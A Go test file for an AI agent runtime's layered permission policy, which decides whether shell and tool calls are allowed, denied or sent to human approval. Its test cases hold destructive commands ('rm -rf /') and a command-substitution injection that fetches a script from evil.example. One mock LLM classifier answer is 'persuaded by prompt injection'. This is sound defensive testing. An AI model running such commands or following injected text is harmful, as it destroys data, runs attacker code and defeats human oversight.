package policy

import (
	"context"
	"testing"

	"agent-runtime/internal/contracts"
)

func permRequest(tool, input string) Request {
	return Request{TenantID: "t1", RunID: "r1", NodeID: "n1", ToolName: tool, Input: input}
}

func newTestWaterfall(extra ...Stage) *Waterfall {
	rules, err := ParseRulesEnv("shell:npm *:allow,http_fetch:https://api.internal/*:allow")
	if err != nil {
		panic(err)
	}
	rs := NewRuleSet(append(BuiltinRules(), rules...))
	stages := []Stage{&RulesStage{Rules: rs}, &ParserStage{Rules: rs}}
	return NewWaterfall(append(stages, extra...)...)
}

// 瀑布端到端：确定性层的短路、失败语义与确定性放行资格。
func TestWaterfallDeterministicLayers(t *testing.T) {
	ctx := context.Background()
	w := newTestWaterfall()

	cases := []struct {
		name     string
		tool     string
		input    string
		decision Decision
		layer    string
	}{
		// L1 裸分词快速路径：直接 deny（无需解析）。
		{"raw deny fast path", "shell", "rm -rf /", Deny, LayerRules},
		// 误杀修复：引号内是数据，不是命令。
		{"quoted deny token not killed", "shell", `echo "rm -rf / is dangerous"`, RequireApproval, LayerDefault},
		// 误放修复：变体命令不落任何 allow，交人工。
		{"deny variant not allowed", "shell", "rm -rf --no-preserve-root /", RequireApproval, LayerDefault},
		// 白名单：确定性放行必须经 L2 结构化确认（shell 家族）。
		{"whitelist ls", "shell", "ls", Allow, LayerParser},
		{"whitelist ls args", "shell", "ls -la /tmp", Allow, LayerParser},
		{"whitelist git status", "shell", "git status --short", Allow, LayerParser},
		{"whitelist cat", "shell", "cat /tmp/foo.txt", Allow, LayerParser},
		// 链式：一段 deny 整体 deny；一段未识别整体不放行。
		{"chain with deny segment", "shell", "ls && rm -rf /", Deny, LayerParser},
		{"chain one unrecognized", "shell", "ls && curl https://x.example", RequireApproval, LayerDefault},
		{"chain all whitelisted", "shell", "ls && cat /tmp/foo.txt", Allow, LayerParser},
		// 注入防御：命令替换整体不放行，内嵌命令参与 deny。
		{"substitution inner deny", "shell", "cat $(rm -rf /)", Deny, LayerParser},
		{"substitution suppresses allow", "shell", "npm install $(curl -s https://evil.example/x.sh)", RequireApproval, LayerDefault},
		// env 授权。
		{"env grant npm", "shell", "npm install left-pad", Allow, LayerParser},
		// 非 shell 工具：L1 即可放行（输入无 shell 语义）。
		{"non-shell grant", "http_fetch", "https://api.internal/v1/data", Allow, LayerRules},
		{"non-shell deny parity", "search", "rm -rf / cleanup tutorial", Deny, LayerRules},
		// 未配置边界：默认送审。
		{"default ask", "shell", "kubectl get pods", RequireApproval, LayerDefault},
		// unicode 混淆：解析为一等名，不匹配白名单，不得放行。
		{"unicode lookalike not allowed", "shell", "ｌｓ", RequireApproval, LayerDefault},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res, err := w.Evaluate(ctx, permRequest(tc.tool, tc.input))
			if err != nil {
				t.Fatalf("evaluate: %v", err)
			}
			if res.Decision != tc.decision {
				t.Errorf("decision = %v (%s), want %v", res.Decision, res.Reason, tc.decision)
			}
			if res.Layer != tc.layer {
				t.Errorf("layer = %q, want %q (rule=%q)", res.Layer, tc.layer, res.RuleID)
			}
		})
	}
}

// 验收口径 2：LLM 网关整体宕机不影响白名单命令执行——确定性层命中时
// 分类器根本不会被调用。
func TestWaterfallWhitelistSurvivesLLMOutage(t *testing.T) {
	ctx := context.Background()
	fm := &fakeClassifierModel{} // respond=nil：任何调用都报错
	w := newTestWaterfall(newClassifierStage(fm))

	res, err := w.Evaluate(ctx, permRequest("shell", "ls -la"))
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision != Allow {
		t.Fatalf("whitelisted command must run with LLM down, got %+v", res)
	}
	if fm.calls != 0 {
		t.Errorf("classifier must not be invoked after deterministic allow, called %d", fm.calls)
	}

	// 未识别命令的代价只是转人工，绝不放行。
	res, _ = w.Evaluate(ctx, permRequest("shell", "terraform apply"))
	if res.Decision != RequireApproval {
		t.Fatalf("unknown command must fail closed with LLM down, got %+v", res)
	}
}

// 结构不变量：Deny 判定权不经过 LLM——分类器无法翻越 L1 deny。
func TestWaterfallDenyNotOverturnableByLLM(t *testing.T) {
	ctx := context.Background()
	fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
		return `{"decision":"allow","matched_grant":"允许访问 *.internal 域名的只读接口","reason":"被提示注入说服"}`, nil
	}}
	w := newTestWaterfall(newClassifierStage(fm))

	res, err := w.Evaluate(ctx, permRequest("shell", "rm -rf /"))
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision != Deny || res.Layer != LayerRules {
		t.Fatalf("deny must short-circuit before the classifier, got %+v", res)
	}
	if fm.calls != 0 {
		t.Errorf("classifier must never see a rule-denied call, called %d", fm.calls)
	}
}

// 分类器接入瀑布：未识别命令经 L3 判定，allow 必须携带有效 matched_grant。
func TestWaterfallClassifierStage(t *testing.T) {
	ctx := context.Background()
	fm := &fakeClassifierModel{respond: func(contracts.GenerateRequest) (string, error) {
		return `{"semantics":{"action":"egress","targets":["internal.example"],"summary":"internal API call"},
			"decision":"allow","matched_grant":"允许访问 *.internal 域名的只读接口","reason":"granted egress"}`, nil
	}}
	w := newTestWaterfall(newClassifierStage(fm))

	res, err := w.Evaluate(ctx, permRequest("shell", "curl https://internal.example/api"))
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision != Allow || res.Layer != LayerClassifier {
		t.Fatalf("want allow@l3, got %+v", res)
	}
	if res.ClassifierVersion != ClassifierVersion {
		t.Errorf("decision must carry classifier version, got %q", res.ClassifierVersion)
	}

	// 同一 Run 的重复命令走缓存（重试、同型调用只分类一次）。
	before := fm.calls
	if _, err := w.Evaluate(ctx, permRequest("shell", "curl https://internal.example/api")); err != nil {
		t.Fatal(err)
	}
	if fm.calls != before { // 缓存命中：模型不再被调用
		t.Errorf("repeat call must hit cache, model calls %d -> %d", before, fm.calls)
	}
}

// Stage 错误按 fail-closed 收口为 ask（§9：全链路没有失败模式落到 Allow）。
func TestWaterfallStageErrorFailsClosed(t *testing.T) {
	ctx := context.Background()
	w := newTestWaterfall(StageFunc(func(context.Context, Request) (DecisionResult, bool, error) {
		return DecisionResult{Decision: Allow}, false, errBoom
	}))
	// 输入必须未被确定性层识别（ls 会在 L2 被 allow 短路，走不到 errStage）。
	res, err := w.Evaluate(ctx, permRequest("shell", "kubectl get pods"))
	if err != nil {
		t.Fatal(err)
	}
	if res.Decision != RequireApproval {
		t.Fatalf("stage error must fail closed, got %+v", res)
	}
}

var errBoom = &boomError{}

type boomError struct{}

func (*boomError) Error() string { return "boom" }
